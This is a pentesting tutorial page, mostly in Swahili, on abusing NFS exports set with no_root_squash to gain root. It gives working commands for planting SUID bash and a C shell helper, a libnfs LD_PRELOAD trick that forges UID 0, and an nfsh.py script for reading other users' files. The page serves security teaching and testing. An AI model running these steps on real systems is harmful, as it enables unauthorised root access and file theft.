# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Msingi kuhusu Squashing

Kwa NFS AUTH_SYS/AUTH_UNIX, seva hukagua ruhusa za faili kwa kutumia `uid` na `gid` zilizotolewa katika kila ombi la RPC. Aina nyingine za usalama, kama vile Kerberos, hutumia vitambulisho tofauti, na seva inaweza kubadilisha vitambulisho vya nambari kabla ya kukagua ruhusa.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Hupanga kila UID na GID kwenye akaunti isiyojulikana, ambayo kwa kawaida ni `nobody` (65534) kwenye Linux. `no_all_squash` ndiyo chaguomsingi kwa maombi yasiyotoka kwa root.<sup>[[4]](#references)</sup>
- **`root_squash`**: Hii ndiyo chaguomsingi kwenye Linux na hupanga maombi yenye UID/GID 0 (root) kwenye akaunti isiyojulikana; UID na GID nyingine hazibadilishwi.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Huzima root squashing, hivyo maombi yenye UID/GID 0 yanaweza kukaguliwa kama root kwenye seva.<sup>[[4]](#references)</sup>

Ikiwa client inayoruhusiwa inaweza kuweka export inayoweza kuandikwa, iliyosanidiwa kwa **`no_root_squash`** katika **`/etc/exports`**, maombi yake yenye UID/GID 0 yanaweza kuandika humo kama mtumiaji root wa seva.<sup>[[4]](#references)</sup>

`root_squash` hubadilisha tu UID/GID 0; chini ya AUTH_SYS, **UID/GID ya nambari isiyo sifuri** ya client iliyoruhusiwa bado inaweza kulingana na akaunti tofauti kwenye seva. Kwa hiyo, export inayoweza kuandikwa inaweza kuwa njia ya kufikia akaunti ya mtumiaji mwingine hata ikiwa root squashing imewashwa, iwapo client inaweza kuunda faili kwa utambulisho huo wa nambari na seva inaruhusu ufikiaji. Kwa SUID/SGID handoff, hakiki pia mmiliki wa faili inayotokana, ruhusa za kutekeleza, hali ya `nosuid` ya mount ya seva, ACLs, na SELinux au sera nyingine. Jina la njia iliyosafirishwa, chaguo la `rw`, au nambari inayolingana peke yake haithibitishi kwamba client inaruhusiwa, export inatumika, au kwamba mifumo hiyo miwili ina utaratibu sawa wa kutafsiri utambulisho. Kagua `/etc/exports` na metadata ya ndani bila kufanya mabadiliko; usiweke mount ya share mpya wala kuunda faili ya majaribio wakati wa enumeration.<sup>[[4]](#references)[[5]](#references)</sup>

Kwa maelezo zaidi kuhusu **NFS**, angalia:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Chaguo la 1 kwa kutumia bash:
- Kwenye client inayoruhusiwa, weka mount ya export inayoweza kuandikwa ukiwa root, nakili **`/bin/bash`** ndani yake, weka bit ya **SUID**, kisha uitekeleze kutoka kwenye mount ya victim isiyotumia `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
    - Ili faili iliyopakiwa iendelee kumilikiwa na root, seva lazima itumie **`no_root_squash`**. Ikiwa root imefanyiwa squash, binary ya SUID ya akaunti nyingine inawezekana tu ikiwa client inaweza kuiunda au kuimiliki kihalali kwa kutumia UID/GID ya nambari ya akaunti hiyo.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Option 2 kwa kutumia C code iliyokompailiwa:
- Mount saraka kutoka kwa client anayeruhusiwa, nakili ndani yake payload iliyokompailiwa inayotumia vibaya ruhusa za SUID, weka biti yake ya **SUID**, kisha uifanye itekelezwe kutoka kwa victim (tazama baadhi ya [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Vizuizi sawa na hapo awali

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Local Exploit

> [!TIP]
> Kumbuka kwamba ikiwa unaweza kuunda **tunnel kutoka kwenye mashine yako hadi kwenye mashine ya mwathiriwa, bado unaweza kutumia toleo la Remote kufanya exploit ya privilege escalation kwa kutunnel ports zinazohitajika**.\
> Mbinu ifuatayo inafaa wakati `/etc/exports` inazuia export kwa IP ya mwathiriwa: client wa mbali hawezi kui-mount, lakini mbinu ya local inaweza kufanya kazi kupitia share ambayo tayari ime-mountiwa kwenye host iliyoruhusiwa.<sup>[[2]](#references)</sup>\
> Kwa mbinu hii ya libnfs isiyohitaji ruhusa maalum, export katika **`/etc/exports`** lazima itumie flag ya `insecure` ili mchakato uweze kutumia source port isiyohifadhiwa; `secure` ndiyo chaguo-msingi, ingawa mchakato unaoweza kufunga port iliyohifadhiwa hauhitaji chaguo hili.<sup>[[1]](#references)[[4]](#references)</sup>

### Taarifa za Msingi

Client ya NFSv3 AUTH_UNIX hujumuisha UID, GID na groups zake zinazotumika kwa sasa katika kila ombi, na server huzitumia kukagua ruhusa. Mbinu hii ya local hutumia mfumo huo vibaya kwa kughushi credentials za RPC kupitia [libnfs](https://github.com/sahlberg/libnfs); moduli yake ya preload inaweza kubadilisha UID/GID katika muktadha wa NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Kukompile Library

Mfano wa libnfs unaweza kuhitaji marekebisho kwa kernel lengwa; mwongozo uliotumika hapa unaeleza hasa kwamba syscall za fallocate ziliondolewa kwa kuziweka kwenye maoni kabla ya kukompile moduli ya preload.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Kuendesha Exploit

Mfano huu huunda helper ndogo ya C inayozindua shell, kisha huiweka kwenye share na kutumia `ld_nfs.so` yenye UID 0 katika muktadha wa NFS ili kuifanya iwe SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Compile msimbo wa exploit:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Weka exploit kwenye share na ubadilishe ruhusa zake kwa kughushi UID**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Tekeleza exploit ili kupata haki za root**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonasi: NFShell kwa Ufikiaji wa Faili kwa Siri

Baada ya kupata ufikiaji wa root, pattern hii ya `nfsh.py` huweka effective UID kuwa UID ya faili lengwa kabla ya kutekeleza amri, na hivyo kuruhusu ufikiaji bila kubadilisha umiliki kwa kujirudia.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Endesha kama:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```

## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Hadithi ya njia isiyojulikana sana ya NFS privesc](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Maelezo ya Itifaki ya NFS Version 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
